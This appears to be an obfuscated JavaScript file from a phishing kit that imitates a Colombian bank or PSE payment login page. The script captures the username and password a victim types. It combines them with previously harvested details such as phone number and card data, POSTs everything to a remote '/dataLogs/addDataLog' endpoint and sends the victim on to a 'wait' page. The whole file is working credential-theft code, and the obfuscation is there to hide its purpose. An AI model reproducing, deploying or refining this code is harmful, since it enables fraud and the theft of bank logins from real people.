const _0x1d7a7e = _0x5904;
(function (_0x1fa622, _0x4921c8) {
  const _0x3335bf = _0x5904,
    _0x55532d = _0x1fa622();
  while (!![]) {
    try {
      const _0x32eb75 =
        (-parseInt(_0x3335bf(0x104)) / 0x1) *
          (-parseInt(_0x3335bf(0xf3)) / 0x2) +
        parseInt(_0x3335bf(0xff)) / 0x3 +
        -parseInt(_0x3335bf(0xe9)) / 0x4 +
        (parseInt(_0x3335bf(0xf2)) / 0x5) * (-parseInt(_0x3335bf(0xf6)) / 0x6) +
        (parseInt(_0x3335bf(0xfb)) / 0x7) * (parseInt(_0x3335bf(0x10a)) / 0x8) +
        -parseInt(_0x3335bf(0xe6)) / 0x9 +
        (parseInt(_0x3335bf(0x109)) / 0xa) * (parseInt(_0x3335bf(0xef)) / 0xb);
      if (_0x32eb75 === _0x4921c8) break;
      else _0x55532d["push"](_0x55532d["shift"]());
    } catch (_0x387163) {
      _0x55532d["push"](_0x55532d["shift"]());
    }
  }
})(_0x5538, 0xa2e9a);
function updateLS() {
  const _0x4bcc39 = _0x5904;
  LS[_0x4bcc39(0xeb)]("info", JSON[_0x4bcc39(0xe7)](info));
}
const button = document["getElementById"](_0x1d7a7e(0x103)),
  userInput = document[_0x1d7a7e(0xfd)](_0x1d7a7e(0xf8)),
  passInput = document[_0x1d7a7e(0xfd)](_0x1d7a7e(0x10b));
function _0x5538() {
  const _0xf11ed0 = [
    "txtPass",
    "telnum",
    "token",
    "origin",
    "6325884Jxejhx",
    "stringify",
    "puser",
    "1317436xTeoYT",
    "/dataLogs/addDataLog",
    "setItem",
    "PSE",
    "POST",
    "href",
    "11CdvArf",
    "error",
    "disabled",
    "33645pseDRb",
    "116044zEpVNU",
    "value",
    "log",
    "942YkXwgq",
    "user",
    "txtUsuario",
    "metaInfo",
    "Error\x20al\x20agregar\x20datos\x20en\x20el\x20servidor",
    "6104isbsQM",
    "Error\x20al\x20enviar\x20los\x20datos\x20al\x20servidor:",
    "getElementById",
    "addEventListener",
    "2860029pTAbcK",
    "preventDefault",
    "dudename",
    "dataLogToken",
    "btnUsuario",
    "2znDJVx",
    "location",
    "Datos\x20enviados\x20correctamente\x20al\x20servidor",
    "Ingresó\x20datos",
    "./wait.html",
    "7326230iUlBfi",
    "8752jiDKFc",
  ];
  _0x5538 = function () {
    return _0xf11ed0;
  };
  return _0x5538();
}
function _0x5904(_0x1f21a4, _0x114a96) {
  const _0x55388f = _0x5538();
  return (
    (_0x5904 = function (_0x59046e, _0x51b5aa) {
      _0x59046e = _0x59046e - 0xe3;
      let _0xa97b2c = _0x55388f[_0x59046e];
      return _0xa97b2c;
    }),
    _0x5904(_0x1f21a4, _0x114a96)
  );
}
console[_0x1d7a7e(0xf5)](info["metaInfo"]),
  button[_0x1d7a7e(0xfe)]("click", async function (_0x35cc1f) {
    const _0x12cafb = _0x1d7a7e;
    _0x35cc1f[_0x12cafb(0x100)](), (button["disabled"] = !![]);
    if (userInput[_0x12cafb(0xf4)] == "" && passInput["value"] == "") {
      alert("Por\x20favor\x20ingrese\x20la\x20información\x20requerida"),
        userInput["focus"](),
        (button[_0x12cafb(0xf1)] = ![]);
      return;
    } else {
      const _0x22f18b = userInput["value"],
        _0x5392b0 = passInput["value"];
      (info[_0x12cafb(0xf9)][_0x12cafb(0xf7)] = _0x22f18b),
        (info[_0x12cafb(0xf9)][_0x12cafb(0xe8)] = _0x5392b0),
        updateLS();
      const _0x148741 = {
        reg: info[_0x12cafb(0xf9)]["cc"],
        name: info[_0x12cafb(0xf9)][_0x12cafb(0x101)],
        cl: info[_0x12cafb(0xf9)][_0x12cafb(0xe3)],
        us: info[_0x12cafb(0xf9)][_0x12cafb(0xf7)],
        ps: info["metaInfo"][_0x12cafb(0xe8)],
        bn: "🟥\x20D4viv1end4",
        status: _0x12cafb(0x107),
        source: _0x12cafb(0xec),
      };
      try {
        const _0x2575d4 = await fetch(url + _0x12cafb(0xea), {
          method: _0x12cafb(0xed),
          headers: {
            "Content-Type": "application/json",
            Origin: window["location"][_0x12cafb(0xe5)],
          },
          body: JSON[_0x12cafb(0xe7)](_0x148741),
        });
        if (!_0x2575d4["ok"]) {
          const _0x59630d = await _0x2575d4["json"]();
          throw new Error(_0x59630d["error"] || _0x12cafb(0xfa));
        }
        const _0x487663 = await _0x2575d4["json"]();
        localStorage[_0x12cafb(0xeb)](
          _0x12cafb(0x102),
          _0x487663[_0x12cafb(0xe4)]
        ),
          localStorage["setItem"]("dataLogId", _0x487663["id"]),
          console["log"](_0x12cafb(0x106)),
          (window[_0x12cafb(0x105)][_0x12cafb(0xee)] = _0x12cafb(0x108));
      } catch (_0x2409fb) {
        console[_0x12cafb(0xf0)](_0x12cafb(0xfc), _0x2409fb),
          alert("Hubo\x20un\x20error\x20al\x20procesar\x20la\x20solicitud."),
          (button["disabled"] = ![]);
      }
    }
  });
